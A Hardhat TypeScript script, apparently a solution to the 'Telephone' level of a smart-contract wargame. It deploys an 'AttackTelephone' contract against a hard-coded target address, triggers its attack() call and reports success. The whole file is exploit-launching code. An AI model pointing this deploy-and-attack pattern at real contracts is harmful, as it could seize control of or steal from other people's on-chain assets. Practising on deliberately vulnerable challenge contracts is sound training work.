import { ethers } from "hardhat";
import { AttackTelephone__factory } from "../typechain-types";
import * as dotenv from "dotenv"
dotenv.config()


const TARGET_CONTRACT_ADDRESS = "0x0659303773FfBd3945c067F58d97Bb78017cCB33"

async function main() {
    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY ?? "")
    const provider = new ethers.providers.JsonRpcProvider(
        process.env.ALCHEMY_HTTPS_API_KEY
    )
    const signer = wallet.connect(provider)

    const attackContractFactory = new AttackTelephone__factory(signer);
    const attackContract = await attackContractFactory.deploy(TARGET_CONTRACT_ADDRESS);

    const tx = await attackContract.attack({
        gasLimit: 1000000
    });
    await tx.wait();
    console.log(`Attack was successful!`)
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});